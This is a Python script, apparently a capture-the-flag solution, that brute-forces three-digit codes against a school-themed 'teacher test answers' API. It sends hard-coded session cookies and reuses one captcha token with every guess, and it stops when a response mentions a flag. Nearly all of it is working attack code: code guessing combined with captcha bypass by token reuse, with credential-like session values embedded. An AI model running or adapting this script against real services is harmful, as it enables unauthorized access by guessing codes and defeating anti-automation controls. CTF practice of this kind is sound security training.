import requests
import time

url = "https://sopromed-031nc82j.avitoctf.ru/api/teacher/tests/1/answers"

cookies = {
    '__cfduid': '638bd185f9e0ce0641daa5be90c7049f',
    'sopromed.sid': 'MTc4NDQ1NTk5OXxEWDhFQVFMX2dBQUJFQUVRQUFBYV80QUFBUVp6ZEhKcGJtY01CUUFEZFdsa0EybHVkQVFDQUFJPXxADjW7cUq97DRg4Ca9w_0kO5rq-dtuRf3B2ShT9ATKyQ=='
}

captcha_token = "0cAFcWeA4HZycnh77iqlH3vmV-ODeTJ47gCE0oXgqI0aKhSZmW9F1jW6PDgfsBXx87tOBf8FZN3WRwGcDeyQwahEGj48eVda2RKZS7mkIqHTEAybJkTxYH-PG0OzYb1mnXwNVjBT2mPr9sgZIkOKyhgECEcuJo3dCrJ1lktjPK-hF9FH5hKLXXGnKNjnzFn9haIc92eTeVZdtkciyZ82mGfPdM_TAHgwJuTMqyLXrDJFLDCn0LajWLDiduUmhyWu5h_dJxnfwgIlNkB-hg7IZ-57VupJPp-lLOimbMSfp9iNv6MOEbuuJMUEytguABeRjYJ5xVXEE5ZbvdbsMR-V5uCnxRI-nPwrjm4ze6Xlz_pgl67atTFzu--1NDz9JcHefou6tzbkb3WonxHF6JPo6Co7kaIEgBf81bxYRnjolNJLfjr9wZL_bzbleuby5sykBIx9dNhWgc79Hm6H5fUUXRnszi2Kx5e-HmP1j8tDYW1OfZEXTYFs63JvJ49ycB8OYdA4vh5uf1eBWk1rPykVOWZbV_SS0NFU88FKyWhYd2ktk8pvBC6GpWlxawwKTDRyK6k3utb4oFT5dgQhskKZC7OPhfejNcCgCpHQpMbCo5xChLALcaqa0yNmisQ9hdg4Tt9z-6jG5KQzrHe_68tc6EYCS2eN4pJhUZgtIrnXVq4XYD_TIQi9DsNyaKTCo6Q-sY7hde8GC97J8onWt0H-5Hmjp8iiksYScvjadYEAHnugtI7QhgJsLZx9Kls39L6blTtfJNxm3Pw5lur64SIwpZJ8JSfGa7DDY6Bx5lpuQWvSKY6Ib-PPEnmx8-RMnlZkwNSd2jLHE6H9I1_JBlPtwIN1_va2Gyb7YNh_e87vYU7Bib7lsWMbg0eJP1UjoXEUVgttb7v52ap2PfrBFAJmqiWydUElyCllOADm1i6nK_CLRrnMXRw9pnAo-7vfhfXommsJgeCVKk7VfOxWC1Y74VNTFQmKVtNpJ6Yv8yVimr19RGZEOQX20nca_YqNGjzJvCxg9ua3nmWjsKldNwKU7tMugh4hY4l1pcbxqlA14RULG_yuyFGU3n8llvGxvS9aIpEIFvcoNiQcVfWVRFnNqozeGnj-nh6iGUqooWDK3loo5SknmFgodqd4-QJdgNPDcDRqha3Y4PLFiWR-RMDCcLQ1PlmKJKKa4CbT63tjl6bdR7REz2A9o2OjeXyB_0Cebyjlskj0NlcDklsoZ_O5yh2kT0uUzg2IeX2J2wxYTVNgjAsisPM2kQr_zi1CsLebrvr_g4CU4_EBSWqCnDa2dHNl2OrlCEr7TzQtgse9d1e08g-BuWwFfZ1X4ad3VydX7BdPND516XqGXbHkf4H7aKCnS4KlDNcendPgEZ63uAbh2s8ac54I07XYUg5oMYeXJ0Im1jR9euKHLtRHQGxrpEP5uglbWH26nFcMinQsZiyfdFSrRQLXa6w9Wseu3LrDIGGLYemU9TQ9oBOo3SCAUrGfBsvKIBqmWMZEdEVh_1SsTx3moOhvKiueftrwfvqUyr7Q-uBCwPfZg_T4R8bKbFDIzmZOx4Oj2D29bM9JHGIG7z1Kcev0NskcQYF7cJL_s1XL8sOJ2qTjUq0qCg61383ZoJyWP_nkxnaeBEYKHrSNh8WgqVAIU0jxJ6G5OUsDiwy0c0QZJj8pC09bTSLuurMi8PD5OPJ5sweK8dbbgNTy6FxA3ZiQkhHGv4sXEFOeKwkeB-hSw6KLU73nk2N-x7xHyr-W8DEbHIUxGgNmitRg4UgKx7J0JyNxsiuzNk5LzhNNxnBpKotXJxDchcM_JB-tANkF6sEkR84t3bJ-R_KqsQFVvt3IWvQ69oIMZdqkxMZJzdyDmtoDJ6G_K5OLHjC8BkZtwFAhah34aqAs_Sr1Cue5HAhDHmUS-GT5eU8XhNVEl8dtefPS_AQKB-6-XAZFUqyqJ-fqUVGRbAY1KlCRh-Dt2lFVvL1OLh77uu1sWklJZ5LkulE3RpJL-1HhRTs799oya1m2nrrVXHMTwDugui5emx4HJqUi-sWdXPI7iCWeX34anIPRN5NcNe4d3u1mZIJ0DOFQclyCMdcW92DMsTv-wJYJnSUNKpnbYXZxRIoTqOKXopAK8NyFSdjh7-saqugBbSeMgtPquSIJD20IULxkpt50ZtbnnBrZ2HKvyiVWXe6GvNJ_hxZMuQhn_kPnUh0Ix0NqFel5GIQFe2IRi_EpJn3ItHV2OK420mmxz0gBToYHnZUcga4HBA1AXyXdd45ZcD08Y5PQ"

print("🔍 Brute forcing codes 300-999...")
print("=" * 50)

for code in range(300, 1000):
    code_str = f"{code:03d}"
    
    response = requests.post(
        url,
        cookies=cookies,
        json={
            "token": code_str,
            "captcha": captcha_token
        }
    )
    
    # Проверяем наличие "avito", "flag" или "ответы"
    if "avito" in response.text.lower() or "flag" in response.text.lower():
        print(f"\n🎉🎉🎉 FOUND! Code: {code_str}")
        print(f"Response: {response.text[:1000]}")
        break
    
    # Проверяем, не протух ли токен капчи
    if "captcha_required" in response.text or "invalid captcha" in response.text.lower():
        print(f"\n⚠️ Токен капчи протух на коде {code_str}!")
        print(f"Ответ: {response.text[:200]}")
        break
    
    if code % 50 == 0:
        print(f"Progress: {code}/999", end="\r")
    
    time.sleep(0.03)  # Быстрее, но не перегружаем сервер

print("\nDone!")
